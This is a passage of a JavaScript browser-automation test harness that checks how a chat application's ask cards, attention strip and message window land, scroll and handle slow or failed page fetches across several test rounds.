    const p0 = await A.evalJs(TAILQ);
    await A.shot('phone-390-tail.png');
    check(`r10 R1 at 390×844 touch: NO card at the end (${p0 && p0.n}); the strip «${p0 && p0.chip}» shows the newest`, !!p0 && p0.n === 0 && p0.atLast === 0 && p0.strip === ids[5] && /· 6 /.test(p0.chip + ' '), p0);
    // R2 (r10) — the strip's question lands the NEWEST ask (its record ~300 records above the window: the window loaded up to
    //      it); the OLDEST through its For-you door (the For-you window is the index of every ask now — «View all»)
    await toConv(A, sid, [], 1280, 800, false); await atTail(A, 6); await sleep(900);
    await A.evalJs(`(() => { window.__cnFlash = []; new MutationObserver((ms) => { for (const m of ms) if (m.target.classList?.contains('chat-ask-flash') && m.target.dataset?.item) window.__cnFlash.push(m.target.dataset.item); }).observe(document.body, { subtree: true, attributes: true, attributeFilter: ['class'] }); return 1; })()`);
    await A.press('.chat-attn-dock .cad-jump', { touch: false }) /* the landing is its own worded door (lane ui-phone-and-fit pick 0: the question now opens the item in place) */;
    const INPLACE = (id) => `(() => { const v = ${VIEW}, c = document.querySelector('.cn-card[data-item="${id}"]'); if (!v || !c) return null; const raw = c.closest('.chat-msg')?._rawMsg, lr = v._messageList.getBoundingClientRect(), r = c.getBoundingClientRect();
      return { ws: v._windowStart, we: v._windowEnd, total: v._total, cmd: raw && raw.content && raw.content[0] && raw.content[0].input ? String(raw.content[0].input.command || '').slice(0, 60) : '', open: !c.classList.contains('cn-fold') && c.classList.contains('cn-open'), docked: c.classList.contains('cn-docked'), inView: r.top >= lr.top - 1 && r.bottom <= lr.bottom + 1, docks: document.querySelectorAll('.cn-card.cn-docked').length, st: Math.round(v._messageList.scrollTop) }; })()`;
    const landed = (id, q) => A.waitFor(`(() => { const x = ${INPLACE(id)}; return !!x && x.open && x.inView && !x.docked && /(Stress|Longer) question ${q}/.test(x.cmd); })()`, 15000);
    await landed(ids[5], 76); await sleep(900);
    const l6 = await A.evalJs(INPLACE(ids[5])), fl6 = await A.evalJs('window.__cnFlash || []');
    await A.shot('desktop-1280-dock-landed.png');
    check(`r10 R2 (RED on bd5c5fd98: no strip — the chip listed them) a tap on the strip's question loads the window UP to the newest ask (records ${l6 && l6.ws}–${l6 && l6.we} of ${l6 && l6.total}) and opens its card IN ITS tool card («${l6 && l6.cmd}»), whole in view, flashed`, !!l6 && l6.ws < t0.ws && /Longer question 76/.test(l6.cmd) && l6.open && l6.inView && fl6.includes(ids[5]), { l6, fl6 });
    await A.evalJs(`(() => { const it = app._inboxModel.byId(${J(ids[0])}); window.__cnFlash = []; app._inboxModel.jump(it.sessionKey, it); return 1; })()`);
    await landed(ids[0], 71); await sleep(900);
    const l1 = await A.evalJs(INPLACE(ids[0])), fl1 = await A.evalJs('window.__cnFlash || []');
    await A.shot('desktop-1280-door-oldest-landed.png');
    check(`R2 the OLDEST ask's For-you door loads the window UP to it (records ${l1 && l1.ws}–${l1 && l1.we} of ${l1 && l1.total}) and opens its card IN ITS tool card («${l1 && l1.cmd}»), whole in view, flashed once; no dock in a window that ends mid-history`, !!l1 && l1.we < l1.total && l1.ws < t0.ws && /Stress question 71/.test(l1.cmd) && l1.open && l1.inView && l1.docks === 0 && fl1.includes(ids[0]), { l1, fl1 });
    // R4 — A FOLDED ROW KEEPS ITS AGE: the window narrowed to 380 px (the questions must give way) — each folded card in the
    //      landed window is ONE line, the question cut if it must, its age whole and the last thing on it
    await A.evalJs(`(() => { const w = ${CHAT(sid)}; if (!w) return false; if (w.isMaximized) app.wm.toggleMaximize(w.id); app.wm.resizeWindowTo(w.id, { w: 380, h: 720 }); return true; })()`); await sleep(900);
    const folds = await A.evalJs(`[...document.querySelectorAll('.cn-card.cn-fold')].filter((c) => c.getClientRects().length).map((c) => { const row = c.querySelector('.cn-rows > .ut-item'), tx = row && row.querySelector('.ut-text'), m = row && row.querySelector('.ut-meta'); if (!row || !tx || !m) return { id: c.dataset.item, ok: false }; const r = row.getBoundingClientRect(), a = m.getBoundingClientRect(), q = tx.getBoundingClientRect(); return { id: c.dataset.item, ok: a.width > 8 && a.right <= r.right + 0.5 && a.left >= q.right - 0.5 && Math.abs(a.bottom - q.bottom) < 6, cut: tx.scrollWidth > tx.clientWidth + 1, age: m.textContent.trim(), w: Math.round(r.width) }; })`);
    await A.shot('desktop-380-folded-ages.png');
    check(`R4 a folded row keeps its age: ${folds.length} folded cards in a 380 px window, ${folds.filter((f) => f.cut).length} questions cut — every age whole, the last thing on its one line («${folds.map((f) => f.age).join('», «')}»)`, folds.length >= 2 && folds.some((f) => f.cut) && folds.every((f) => f.ok), folds);
    // R3 (r10) — the newest answered elsewhere: the strip's row goes to the next newest IN THE SAME FRAME its count says 5
    await toConv(A, sid, [], 1280, 800, false); await atTail(A, 6); await sleep(900);
    await A.evalJs(`(() => { window.__cnTail = []; const t0 = performance.now(); const f = () => { const c = document.querySelector('.chat-attn-dock:not([hidden]) .cad-count'), d = document.querySelector('.chat-attn-dock:not([hidden]) .cad-rows > .ut-item'); window.__cnTail.push(((c && c.offsetParent ? (/· (\\d+)/.exec(c.textContent) || [])[1] : '0') || '?') + '/' + (d ? d.dataset.id : '')); if (performance.now() - t0 < 3000) requestAnimationFrame(f); }; requestAnimationFrame(f); return 1; })()`);
    const st = await A.evalJs(`fetch('/api/user-todos/' + encodeURIComponent(${J(ids[5])}), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ status: 'done' }) }).then((r) => r.status)`);
    await sleep(3300);
    const states = [...new Set(await A.evalJs('window.__cnTail || []'))];
    check(`r10 R3 the newest ask answered (another client, POST ${st}) ⇒ the strip's row goes to the next newest and its count says 5 in the SAME frame (frames: ${states.join(' → ')})`, st === 200 && states.length === 2 && states[0] === '6/' + ids[5] && states[1] === '5/' + ids[4], states);
    // R5 (a) — THE TRAY ROW'S DOOR (its conversation's name) for an ask ~300 records above the window: the view lands there
    const door = async (id) => {
      await A.press('#taskbar-user-todos', { touch: false });
      await A.waitFor(`!!document.querySelector('#user-todos-popup .ut-item[data-id="${id}"] .ut-sess')`, 6000);
      await A.press(`#user-todos-popup .ut-item[data-id="${id}"] .ut-sess`, { touch: false });
    };
    await door(ids[1]);
    await landed(ids[1], 72); await sleep(900);
    const d1 = await A.evalJs(INPLACE(ids[1]));
    await A.shot('desktop-1280-door-landed.png');
    check(`R5 (RED on 90c995a3: the window stays at the tail, the ask out of sight) the tray row's door lands on the record that filed it — the window loaded up to it (records ${d1 && d1.ws}–${d1 && d1.we}), its card open in its tool card («${d1 && d1.cmd}»), whole in view`, !!d1 && d1.we < d1.total && /Stress question 72/.test(d1.cmd) && d1.open && d1.inView, d1);
    // R5 (b) — an ask with NO record (filed before what the conversation's record holds — the asks filed before 2.369.360):
    //          no record names it (do:h73) and its createdAt is set before the first record (this page's copy — nothing at or
    //          before its filing, no CLI call before it) ⇒ the door docks it at the end and says why
    const first = ((await page(0, 1)).messages || [])[0];
    const firstTs = first ? Number(first.ts) || 0 : 0;
    // (this page's store copy — every snapshot read through it, so a refresh the tray's open fetches cannot undo the shift)
    const shifted = await A.evalJs(`(() => { const m = app._inboxModel, get = Object.getOwnPropertyDescriptor(m, 'todos').get, id = ${J(ids[2])}, at = ${firstTs} - 3600e3;
      Object.defineProperty(m, 'todos', { configurable: true, get() { const t = get.call(m); for (const i of t.open || []) if (i.id === id) i.createdAt = at; return t; } }); ${VIEW}._needsCards.schedule(); return !!m.todos.open.find((i) => i.id === id && i.createdAt === at); })()`);
    await A.evalJs(`(() => { window.__cnToast = []; new MutationObserver(() => { for (const x of document.querySelectorAll('.global-toast')) if (!window.__cnToast.includes(x.textContent)) window.__cnToast.push(x.textContent); }).observe(document.body, { subtree: true, childList: true, characterData: true }); return 1; })()`);
    await door(ids[2]);
    await A.waitFor(`(() => { const v = ${VIEW}; return !!v && v._windowEnd >= v._total && (window.__cnToast || []).some((x) => /record was kept/.test(x)); })()`, 15000); await sleep(900);
    const n1 = await A.evalJs(`(() => { const v = ${VIEW}, l = v._messageList; return { atEnd: v._windowEnd >= v._total, gap: Math.round(l.scrollHeight - l.clientHeight - l.scrollTop), card: !!document.querySelector('.cn-card[data-item="${ids[2]}"]'), toast: (window.__cnToast || []).join(' | '), strip: !!v._attnDock && !v._attnDock.hidden }; })()`);
    await A.shot('desktop-1280-no-record-said.png');
    check(`r10 R5 an ask with no record at all (RED on bd5c5fd98: the door DOCKED it at the end, «asked before this conversation's record was kept») ⇒ the door lands at the live END and SAYS it («${n1 && n1.toast}»); no card for it anywhere in the flow; the strip stands`, shifted && firstTs > 0 && !!n1 && n1.atEnd && n1.gap <= 2 && !n1.card && /Asked before this conversation's record was kept/.test(n1.toast) && n1.strip, n1);
    // R5 (c) — AN OPEN CONVERSATION THE PERSON SCROLLED: a broadcast (a new filing) never moves it; a press on a door lands
    const lc = await A.evalJs(`(() => { const r = ${VIEW}._messageList.getBoundingClientRect(); return { x: Math.round(r.left + r.width / 2), y: Math.round(r.top + r.height / 2) }; })()`);
    for (let i = 0; i < 4; i++) { await A.cdp('Input.dispatchMouseEvent', { type: 'mouseWheel', x: lc.x, y: lc.y, deltaX: 0, deltaY: -240 }); await sleep(120); }
    await sleep(2500); // the wheel's landing settles (content-visibility's heights) before the reader's line is read
    // the reader's line: the first record reaching past the list's middle — read again after the broadcast, BY ITS ID
    const READ = (id) => `(() => { const v = ${VIEW}, l = v._messageList, lr = l.getBoundingClientRect(), mid = lr.top + lr.height / 2; const m = ${J(id)} ? [...l.querySelectorAll(':scope > .chat-msg')].find((x) => x.dataset.msgId === ${J(id)}) : [...l.querySelectorAll(':scope > .chat-msg')].find((x) => { const r = x.getBoundingClientRect(); return r.height > 0 && r.bottom > mid; }); return { st: Math.round(l.scrollTop), pinned: v._pinned, id: m ? m.dataset.msgId : null, top: m ? Math.round(m.getBoundingClientRect().top * 10) / 10 : null }; })()`;
    const s0 = await A.evalJs(READ(null));
    // the For-you store's broadcast — this conversation's ask answered on another client (the chip and the dock re-drawn, no
    // new turn: a new turn folds the turn before it, chat-view's own run fold, whatever the landing does)
    const st5 = await A.evalJs(`fetch('/api/user-todos/' + encodeURIComponent(${J(ids[4])}), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ status: 'done' }) }).then((r) => r.status)`);
    await A.waitFor(`/· 3 /.test((document.querySelector('.chat-attn-dock:not([hidden]) .cad-count') || {}).textContent + ' ')`, 8000); await sleep(1200);
    const s1 = await A.evalJs(READ(s0.id));
    check(`R5 a BROADCAST (this conversation's ask answered on another client — POST ${st5}, the chip «· 3») never moves a reader who scrolled — the record at the reader's line stays (${s0.id} at ${s0.top} → ${s1.top} px), unpinned`, st5 === 200 && !!s0.id && !s0.pinned && !s1.pinned && s1.id === s0.id && Math.abs(s0.top - s1.top) <= 1, { s0, s1 });
    await door(ids[3]);
    await landed(ids[3], 74); await sleep(900);
    const c1 = await A.evalJs(INPLACE(ids[3]));
    check(`R5 …a PRESS on its tray row's door does: the view lands on the record that filed it («${c1 && c1.cmd}»), its card open, whole in view`, !!c1 && /Stress question 74/.test(c1.cmd) && c1.open && c1.inView, c1);
  } catch (e) { fail++; console.log('  ✗ ⑬ threw: ' + (e?.message || e)); }
  lap('⑬ done');

  // ── ⑭ THE TAIL, ROUND 2 (lane needs-card-tail r2 — the r1 verdict on 9de5c902; its harnesses acc-r1-below-window /
  // acc-r1-race / make-fold-leg / the claim run's 4-wheels + back-at-bottom + the two-client swap, folded into ONE
  // conversation: three asks spread over ~900 records) ──
  console.log('⑭ THE TAIL r2 (r10: no card at the END — the strip above the message box holds the newest) — older history loaded, back at the bottom; a landing reads DOWN as well as up; a stale landing never moves the reader; the docked ask answered elsewhere moves no reader; a landing unfolds what it lands on');
  try {
    for (const it of (await api()).open) await A.evalJs(`fetch('/api/user-todos/' + encodeURIComponent(${J(it.id)}), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ status: 'done' }) }).then((r) => r.status)`);
    const sid = await newConv('r2'); await sleep(600);
    let bsid = '', total = 0;
    const page = async (offset, limit) => { try { return await (await fetch(`${ORIGIN}/api/session-messages?backend=claude&backendSessionId=${encodeURIComponent(bsid)}&cwd=${encodeURIComponent(WORK)}&offset=${offset}&limit=${limit}`)).json(); } catch { return {}; } };
    const grown = async (n) => { for (let i = 0; i < 200; i++) { total = (await page(0, 1)).total || 0; if (total >= n) return total; await sleep(200); } return total; };
    const q = [];
    for (const n of [81, 82, 83]) {
      sayTo(sid, `an ask do:q${n}`);
      const it = (await byText(new RegExp(`^Stress question ${n}:`), 1))[0];
      q.push(it);
      if (it && !bsid) bsid = it.sessionKey.slice(it.sessionKey.indexOf(':') + 1);
      await sleep(2600); // the history that follows is stamped past the filing (placementOf's SKEW_MS)
      const before = (await page(0, 1)).total || 0;
      sayTo(sid, 'a long history do:fill150');
      await grown(before + 300);
    }
    const all = (await page(0, total)).messages || [];
    const where = q.map((it) => (it ? all.findIndex((m) => m.role === 'tool' && JSON.stringify(m.content || '').includes(it.id)) : -1));
    check(`setup: three asks spread over ${total} records — their records at ${where.join(' · ')}`, q.every(Boolean) && total >= 900 && where.every((k) => k >= 0) && where[1] > 250 && where[2] > 550 && where[2] < total - 250, { total, where });
    const ids = q.map((it) => it && it.id);
    const DOMQ = `(() => { const v = ${VIEW}, l = v._messageList; const kids = [...l.querySelectorAll(':scope > .chat-msg:not(.chat-gap-msg)')], lastKid = kids[kids.length - 1]; const cards = [...l.querySelectorAll(':scope > * > .cn-cards > .cn-card.cn-open')]; const lr = l.getBoundingClientRect(), chip = document.querySelector('.chat-attn-dock:not([hidden]) .cad-count'), srow = v._attnDock && !v._attnDock.hidden ? v._attnDock.querySelector('.cad-rows > .ut-item') : null;
      return { strip: srow ? srow.dataset.id : null, ws: v._windowStart, we: v._windowEnd, total: v._total, pinned: v._pinned, gap: Math.round(l.scrollHeight - l.clientHeight - l.scrollTop), nDom: kids.length, chip: chip ? chip.textContent.trim() : '',
        cards: cards.map((c) => { const h = c.closest('.chat-msg'), r = c.getBoundingClientRect(); return { id: c.dataset.item, docked: c.classList.contains('cn-docked'), host: (h?.dataset.msgId || '').replace(/^.*:(m|t):/, '$1:'), hostDomIdx: kids.indexOf(h), atDomEnd: h === lastKid, dock: (c.querySelector('.cn-dock') || {}).textContent || '', shown: c.getClientRects().length > 0 && r.height > 0, inView: r.bottom > lr.top && r.top < lr.bottom }; }) }; })()`;
    const wheel = async (n, dy) => { const lc = await A.evalJs(`(() => { const r = ${VIEW}._messageList.getBoundingClientRect(); return { x: Math.round(r.left + r.width / 2), y: Math.round(r.top + r.height / 2) }; })()`); for (let i = 0; i < n; i++) { await A.cdp('Input.dispatchMouseEvent', { type: 'mouseWheel', x: lc.x, y: lc.y, deltaX: 0, deltaY: dy }); await sleep(120); } await sleep(2500); };
    const atTailN = (n) => A.waitFor(`(() => { const v = ${VIEW}, c = document.querySelector('.chat-attn-dock:not([hidden]) .cad-count'); return !!v && v._total >= ${total} && v._windowEnd >= v._total && !!c && new RegExp('· ${n} ').test(c.textContent + ' '); })()`, 20000);
    const docked = (w) => w.cards.filter((c) => c.docked);
    // #1 THE END IS THE DISPLAY ORDER'S: at the tail, then one older page loaded by the reader's own wheel, then back down
    await toConv(A, sid, [], 1280, 800, false); await atTailN(3); await sleep(1500);
    const w0 = await A.evalJs(DOMQ);
    check(`r10 #1 at the tail (records ${w0.ws}–${w0.we} of ${w0.total}) NO card at the end (RED on bd5c5fd98: ONE docked under the last record) — the strip shows the newest ask`, !w0.cards.some((c) => c.atDomEnd) && docked(w0).length === 0 && w0.strip === ids[2] && /· 3 /.test(w0.chip + ' '), w0);
    await wheel(4, -240);
    const w1 = await A.evalJs(DOMQ);
    await A.shot('desktop-1280-r2-after-4-wheels.png');
    check(`#1 (RED on 9de5c902: drawn under the older page's last record, mid-history, «· 3 waiting» with filler below it) the reader scrolled up 4 wheels — older history loaded (records ${w1.ws}–${w1.we}) — r10: still NO card at the end, the strip unchanged (the newest)`, w1.ws < w0.ws && !w1.cards.some((c) => c.atDomEnd) && docked(w1).length === 0 && w1.strip === ids[2], w1);
    for (let k = 0; k < 14; k++) { await wheel(1, 400); const g = await A.evalJs(DOMQ); if (g.gap <= 2) break; }
    await sleep(1500);
    const w2 = await A.evalJs(DOMQ);
    await A.shot('desktop-1280-r2-back-at-bottom.png');
    check(`#1 (RED on 9de5c902: no card at the end while the chip says «· 3 questions») back down at the bottom (r10): no card at the end, the strip «${w2.chip}» — the newest`, w2.gap <= 2 && !w2.cards.some((c) => c.atDomEnd) && w2.strip === ids[2] && /· 3 /.test(w2.chip + ' '), w2);
    // #2 A LANDING READS BOTH WAYS: the walk the chip invites — the oldest (the window loads at the top), then one filed BELOW
    const ST = (id) => `(() => { const v = ${VIEW}, c = document.querySelector('.cn-card[data-item="' + ${J(id)} + '"]'); const raw = c && c.closest('.chat-msg')?._rawMsg; const lr = v._messageList.getBoundingClientRect(), r = c ? c.getBoundingClientRect() : null; return { ws: v._windowStart, we: v._windowEnd, total: v._total, card: !!c, docked: !!c && c.classList.contains('cn-docked'), dock: c ? (c.querySelector('.cn-dock') || {}).textContent || '' : '', cmd: raw && raw.content && raw.content[0] && raw.content[0].input ? String(raw.content[0].input.command || '').slice(0, 40) : '', inView: !!r && r.height > 0 && r.top >= lr.top - 1 && r.bottom <= lr.bottom + 1 }; })()`;
    // (r10: the chip's list is gone — an ask CHOSEN lands through its For-you door: model.jump → landOnFiling, THE ONE LANDING)
    const pick = async (id) => { await A.evalJs(`(() => { const it = app._inboxModel.byId(${J(id)}); app._inboxModel.jump(it.sessionKey, it); return 1; })()`); };
    const choose = async (id, n) => { await pick(id); await A.waitFor(`(() => { const x = ${ST(id)}; return x.card && x.inView && (/question ${n}/.test(x.cmd) || x.docked); })()`, 15000).catch(() => {}); await sleep(1200); return A.evalJs(ST(id)); };
    const s1 = await choose(ids[0], 81);
    check(`#2 the oldest (q81) lands at its record — the window loaded up to it (records ${s1.ws}–${s1.we})`, s1.card && !s1.docked && /question 81/.test(s1.cmd) && s1.ws === 0, s1);
    const s2 = await choose(ids[2], 83);
    await A.shot('desktop-1280-r2-below-window.png');
    check(`#2 (RED on 9de5c902: docked at the live end with «asked before this conversation's record was kept») from that window, q83 — its record BELOW it, at ${where[2]} — lands AT its record (records ${s2.ws}–${s2.we})`, s2.card && !s2.docked && /question 83/.test(s2.cmd) && s2.ws <= where[2] && s2.we > where[2], s2);
    const s3 = await choose(ids[1], 82);
    check(`#2 …and q82 (its record at ${where[1]}, ABOVE that window) lands at its record (records ${s3.ws}–${s3.we})`, s3.card && !s3.docked && /question 82/.test(s3.cmd) && s3.ws <= where[1] && s3.we > where[1], s3);
    // #3 THE DISPLACEMENT LAW: q82 on screen; a slow page read (2.5 s each — a remote transcript), q81 pressed (its read
    // upward in flight), then q82 — the person's latest choice
    await A.evalJs(`(() => { const v = ${VIEW}; v.__slowFetch = v._fetchMessages; v._fetchMessages = (o, l) => new Promise((r) => setTimeout(r, 2500)).then(() => v.__slowFetch.call(v, o, l)); return 1; })()`);
    await pick(ids[0]); await sleep(300);
    await pick(ids[1]); await sleep(1500);
    const r1 = await A.evalJs(ST(ids[1]));
    await sleep(9000);
    const r2 = await A.evalJs(ST(ids[1])), r81 = await A.evalJs(ST(ids[0]));
    await A.evalJs(`(() => { const v = ${VIEW}; if (v.__slowFetch) { v._fetchMessages = v.__slowFetch; delete v.__slowFetch; } return 1; })()`);
    await A.shot('desktop-1280-r2-race.png');
    check(`#3 (RED on 9de5c902: 9 s later the stale q81 landing dragged the view to records 0–50) the LATEST press stands — q82 in view (records ${r2.ws}–${r2.we}), the older landing's read finished and moved nothing`, r1.card && r1.inView && r2.card && r2.inView && /question 82/.test(r2.cmd) && r2.ws === r1.ws, { r1, r2, r81 });
    // minor THE DOCKED ASK ANSWERED ELSEWHERE MOVES NO READER: the tail, 4 wheels up, q83 (docked) answered by another client
    await toConv(A, sid, [], 1280, 800, false); await atTailN(3); await sleep(1500);
    await wheel(4, -240);
    const READ = (id) => `(() => { const v = ${VIEW}, l = v._messageList, lr = l.getBoundingClientRect(), mid = lr.top + lr.height / 2; const m = ${J(id)} ? [...l.querySelectorAll(':scope > .chat-msg')].find((x) => x.dataset.msgId === ${J(id)}) : [...l.querySelectorAll(':scope > .chat-msg')].find((x) => { const r = x.getBoundingClientRect(); return r.height > 0 && r.bottom > mid; }); return { st: Math.round(l.scrollTop), pinned: v._pinned, id: m ? m.dataset.msgId : null, top: m ? Math.round(m.getBoundingClientRect().top * 10) / 10 : null }; })()`;
    const b0 = await A.evalJs(READ(null)), d0 = await A.evalJs(DOMQ);
    const stc = await A.evalJs(`fetch('/api/user-todos/' + encodeURIComponent(${J(ids[2])}), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ status: 'done' }) }).then((r) => r.status)`);
    await A.waitFor(`/· 2 /.test((document.querySelector('.chat-attn-dock:not([hidden]) .cad-count') || {}).textContent + ' ')`, 8000); await sleep(1500);
    const b1 = await A.evalJs(READ(b0.id)), d1 = await A.evalJs(DOMQ);
    check(`minor (RED on 9de5c902: 87 px — the misplaced dock above the reader shrank) the DOCKED ask answered on another client (POST ${stc}, the chip «${d1.chip}») moves the scrolled reader 0 px (${b0.id} at ${b0.top} → ${b1.top}); the strip went to the next newest (r10 — no card at the end)`, stc === 200 && !!b0.id && !b0.pinned && b1.id === b0.id && Math.round(Math.abs(b0.top - b1.top)) === 0 && d1.strip === ids[1] && !d1.cards.some((c) => c.atDomEnd), { b0, b1, d0, d1 });
    // #4 A LANDING UNFOLDS WHAT IT LANDS ON: q83 answered — its quiet record sits in its Bash card, folded by default; the
    // For-you door (model.jump → landOnFiling → landOnItem) from the bottom
    for (let k = 0; k < 14; k++) { await wheel(1, 400); const g = await A.evalJs(DOMQ); if (g.gap <= 2) break; }
    const FOLD = `(() => { const v = ${VIEW}, c = document.querySelector('.cn-card[data-item="' + ${J(ids[2])} + '"]'); const host = c && c.closest('.chat-msg'); const l = v._messageList, lr = l.getBoundingClientRect(); const r = c ? c.getBoundingClientRect() : null;
      return { card: !!c, cls: c ? c.className : '', rects: c ? c.getClientRects().length : -1, hostFolded: !!host && host.classList.contains('chat-run-collapsed'), hostDisplay: host ? getComputedStyle(host).display : null, inView: !!r && r.height > 0 && r.bottom > lr.top && r.top < lr.bottom, st: Math.round(l.scrollTop), ws: v._windowStart, we: v._windowEnd }; })()`;
    await A.evalJs(`(() => { const it = app._inboxModel.byId(${J(ids[2])}); app._inboxModel.jump(it.sessionKey, it); return 1; })()`);
    await A.waitFor(`(() => { const x = ${FOLD}; return x.card && x.ws <= ${where[2]} && x.we > ${where[2]}; })()`, 15000).catch(() => {});
    await sleep(1600);
    const f1 = await A.evalJs(FOLD);
    await A.shot('desktop-1280-r2-folded-door.png');
    check(`#4 (RED on 9de5c902: «card» returned, the record display:none, the list run to scrollTop 0) the For-you door of the ANSWERED q83 (its record folded in a closed run) opens the run and lands on it — its quiet record visible, in view (records ${f1.ws}–${f1.we}, scrollTop ${f1.st})`, f1.card && /cn-done/.test(f1.cls) && f1.rects > 0 && !f1.hostFolded && f1.hostDisplay !== 'none' && f1.inView, f1);
    // ── ⑮ THE TAIL, ROUND 3 (lane needs-card-tail r3 — the r2 delta verdict on ed660f19: the tail road's jumpToBottom took no
    // `stale` — an older landing's tail fetch replaced the window a newer landing, or the reader's own wheel, had just made).
    // q84 is filed with no record (no record names it, its createdAt set before the first record — this page's copy, as R5
    // (b)) ⇒ its landing reads up to record 0 (−1) and takes the TAIL road; the tail page made slow (2.5 s)
    console.log('⑮ THE TAIL r3 — the tail road obeys the displacement law: an older landing\'s slow tail fetch never replaces the window a newer press (or the reader\'s wheel) made');
    sayTo(sid, 'an ask do:h84');
    const q84 = (await byText(/^Stress question 84:/, 1))[0];
    const firstTs15 = Number((((await page(0, 1)).messages || [])[0] || {}).ts) || 0;
    const shifted15 = !!q84 && await A.evalJs(`(() => { const m = app._inboxModel, d = Object.getOwnPropertyDescriptor(m, 'todos'); window.__todos15 = d; const get = d.get, id = ${J(q84 ? q84.id : '')}, at = ${firstTs15} - 3600e3;
      Object.defineProperty(m, 'todos', { configurable: true, get() { const t = get.call(m); for (const i of t.open || []) if (i.id === id) i.createdAt = at; return t; } }); ${VIEW}._needsCards.schedule(); return !!m.todos.open.find((i) => i.id === id && i.createdAt === at); })()`);
    const t0 = await choose(ids[1], 82); // q82 on screen: a window loaded mid-history
    // the TAIL page slowed (2.5 s — the read's pages go through the same fetch and stay quick); every landing's road and result written down (the precondition: press 1 TOOK the tail road)
    const SLOW = (on) => A.evalJs(`(() => { const v = ${VIEW}, nc = v._needsCards; if (${on}) { v.__slowPage = v._fetchMessagePage; v._fetchMessagePage = (o, l) => { if (o + l < v._total) return v.__slowPage.call(v, o, l); window.__roads15.push('tailPage(' + o + ')'); return new Promise((r) => setTimeout(r, 2500)).then(() => v.__slowPage.call(v, o, l)); }; window.__roads15 = []; nc.__land = nc.land; nc.land = (x, o) => { const id = typeof x === 'string' ? x : x && x.id; window.__roads15.push('land:' + id); return nc.__land.call(nc, x, o).then((r) => { window.__roads15.push('landed:' + id + '=' + r); return r; }); }; } else { if (v.__slowPage) { v._fetchMessagePage = v.__slowPage; delete v.__slowPage; } if (nc.__land) { nc.land = nc.__land; delete nc.__land; } } return 1; })()`);
    const roads15 = () => A.evalJs('(window.__roads15 || []).slice()');
    await SLOW(true);
    await pick(q84.id); await sleep(700);     // press 1: its read up to −1 is done, its tail page out (2.5 s)
    await pick(ids[1]); await sleep(4200);    // press 2, the person's latest choice: q82, on screen — then the tail page returns
    const t1 = await A.evalJs(ST(ids[1])), ro1 = await roads15();
    await A.shot('desktop-1280-r3-tail-race.png');
    check(`#1 precondition: press 1 (q84, no record) TOOK the tail road — its tail page was out when press 2 landed q82 (${ro1.join(' → ')})`, shifted15 && ro1[0] === 'land:' + q84.id && ro1.some((r) => /^tailPage\(/.test(r)) && ro1.indexOf('land:' + ids[1]) > ro1.findIndex((r) => /^tailPage\(/.test(r)), ro1);
    check(`#1 (RED on ed660f19: the slow tail page came back and rebuilt the window at the live end — q82 gone, pinned) the LATEST press stands: q82 in view in the window it was landed in (records ${t1.ws}–${t1.we} of ${t1.total}); the older landing's tail read finished and replaced nothing`, shifted15 && t0.card && t1.card && t1.inView && /question 82/.test(t1.cmd) && t1.ws === t0.ws && t1.we < t1.total, { t0, t1, roads: ro1 });
    // …the reader's own wheel while a landing's tail page is out (from a window mid-history again: q82 landed first)
    const t0b = await choose(ids[1], 82);
    await pick(q84.id); await sleep(700);
    await wheel(2, 240);                      // (wheel() waits 2.5 s after its notches: the tail page is back)
    await sleep(1500);
    const t2 = await A.evalJs(DOMQ), ro2 = (await roads15()).slice(ro1.length);
    await A.shot('desktop-1280-r3-tail-wheel.png');
    check(`#1 (RED on ed660f19: yanked to the live end, pinned) the reader's wheel while the tail page is out ⇒ the page's result is dropped: the window stays mid-history (records ${t2.ws}–${t2.we} of ${t2.total}), not pinned (${ro2.join(' → ')})`, t0b.card && t0b.we < t0b.total && ro2.some((r) => /^tailPage\(/.test(r)) && t2.we < t2.total && !t2.pinned, { t0b, t2, roads: ro2 });
    await SLOW(false);
    // ── ⑯ THE TAIL, ROUND 4 (lane needs-card-tail r4 — the r3 delta verdict on b3fef024; its accdisp probe's (d) (e) (f3) and
    // the index road's failed show): the law both ways (the ↓ pressed BEFORE a landing), a failed tail page moves nothing, a
    // stale landing's held live turn counted once, a show that fails after a jump puts back what the jump changed. The tail
    // page (flagged at its jumpToBottom call — the read's pages stay quick) made slow or failing on demand; every landing's
    // road and result written down
    {
      console.log('⑯ THE TAIL r4 — the law both ways (↓ before a landing); a failed tail page moves nothing; a stale landing counts its held turn once; a failed show after a jump puts back what it changed');
      const TAIL16 = (o) => A.evalJs(`(() => { const v = ${VIEW}, nc = v._needsCards, o = ${J(o)};
        if (o && !v.__page16) { v.__page16 = v._fetchMessagePage; window.__r16 = [];
          nc.__land16 = nc.land; nc.land = (x, op) => { const id = typeof x === 'string' ? x : x && x.id; window.__r16.push('land:' + id); return nc.__land16.call(nc, x, op).then((r) => { window.__r16.push('landed:' + id + '=' + r); return r; }); };
          v.__trace16 = v._trace; v._trace = function (k, d) { if (/^(jumpToBottom:stale|tailStale|jumpToIndex:stale|tailHold|tailRefetch)$/.test(k)) window.__r16.push('trace:' + k); return v.__trace16.call(v, k, d); };
          v.__jtb16 = v.jumpToBottom; v.jumpToBottom = function (a) { window.__inJtb16 = true; try { return v.__jtb16.call(v, a); } finally { window.__inJtb16 = false; } };
          v._fetchMessagePage = function (off, l, opt) { const w = window.__tail16 || {}, tail = !!window.__inJtb16; window.__inJtb16 = false;
            if (!tail || !(w.n > 0)) return v.__page16.call(v, off, l, opt);
            w.n--; window.__r16.push('tailPage(' + off + ')');
            return new Promise((res, rej) => setTimeout(() => { if (w.fail) { window.__r16.push('tailPageFAILED'); rej(new Error('the tail page failed (⑯)')); } else { window.__r16.push('tailPageBack'); res(v.__page16.call(v, off, l, opt)); } }, w.ms || 600)); }; }
        if (o) window.__tail16 = o;
        if (!o && v.__page16) { v._fetchMessagePage = v.__page16; delete v.__page16; nc.land = nc.__land16; delete nc.__land16; v._trace = v.__trace16; delete v.__trace16; v.jumpToBottom = v.__jtb16; delete v.__jtb16; window.__tail16 = null; }
        return 1; })()`);
      const r16 = () => A.evalJs('(window.__r16 || []).slice()');
      const wait16 = (re, ms = 15000) => A.waitFor(`(window.__r16 || []).some((r) => ${re.toString()}.test(r))`, ms).catch(() => { });
